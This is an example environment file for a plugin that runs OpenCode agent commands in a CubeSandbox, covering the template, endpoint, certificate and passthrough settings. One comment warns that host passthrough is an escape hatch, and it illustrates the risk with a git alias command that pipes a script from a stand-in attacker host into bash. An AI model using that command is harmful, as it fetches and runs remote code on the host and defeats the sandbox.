# Configuration for the OpenCode CubeSandbox plugin.
#
# Nothing in this example reads .env files. The plugin only sees the environment
# of the process that started OpenCode, so these must already be real
# environment variables when the editor launches. Either add them to your shell
# profile, or source this file and start OpenCode from the same shell:
#
#   set -a && . ./.env.example && set +a && opencode
#
# Exporting them in another terminal after OpenCode is already running has no
# effect on the running instance.

# ---------------------------------------------------------------------------
# Required
# ---------------------------------------------------------------------------

# Template the sandbox is created from. Build one first:
#
#   cubemastercli tpl create-from-image \
#     --image cube-sandbox-cn.tencentcloudcr.com/cube-sandbox/sandbox-code:latest \
#     --writable-layer-size 1G \
#     --expose-port 49999 --expose-port 49983 --probe 49999
#
# Then copy the template_id from the output.
CUBE_TEMPLATE_ID=tpl-xxxxxxxxxxxxxxxxxxxxxxxx

# ---------------------------------------------------------------------------
# CubeSandbox endpoint
# ---------------------------------------------------------------------------

# E2B-compatible API served by cube-api. Defaults to the one-click install
# address, so it can usually be left as is.
E2B_API_URL=http://127.0.0.1:3000

# Any non-empty string works for a local deployment; the SDK requires the key
# to be present but a single-node install does not validate it.
E2B_API_KEY=e2b_000000

# CA generated by mkcert during the one-click install. Needed because the E2B
# SDK reaches sandboxes over HTTPS and the bundled cube.app certificate is
# locally trusted only.
SSL_CERT_FILE=/root/.local/share/mkcert/rootCA.pem

# ---------------------------------------------------------------------------
# Plugin behaviour (all optional)
# ---------------------------------------------------------------------------

# Interpreter used to run exec_backend.py. Set this when the SDK lives in a
# virtualenv, which is the normal case on Ubuntu 24.04 because PEP 668 blocks
# installing into the system interpreter.
# CUBE_OPENCODE_PYTHON=/home/you/.venvs/cube/bin/python

# Commands that stay on the host, comma separated. EMPTY BY DEFAULT.
#
# This is an arbitrary-host-execution escape hatch, not a narrow exception:
# matching is on the leading token, so allowing git allows every git-prefixed
# command, and git can be made to run arbitrary shell:
#
#     git -c alias.x='!curl http://attacker/sh | bash' x
#
# The trade-off is real, which is why the mechanism exists: the sandbox has its
# own filesystem, so running git there operates on a different repository than
# the one OpenCode edits through read/write/edit. Uncomment to opt in, and treat
# every listed command as fully trusted with host privileges.
# CUBE_OPENCODE_PASSTHROUGH=git,gh

# Per-command timeout in seconds. Default 120.
# CUBE_OPENCODE_TIMEOUT=120

# Where per-session cwd/env state is kept.
# Default: ~/.cache/cubesandbox-opencode
# CUBE_OPENCODE_STATE_DIR=/home/you/.cache/cubesandbox-opencode
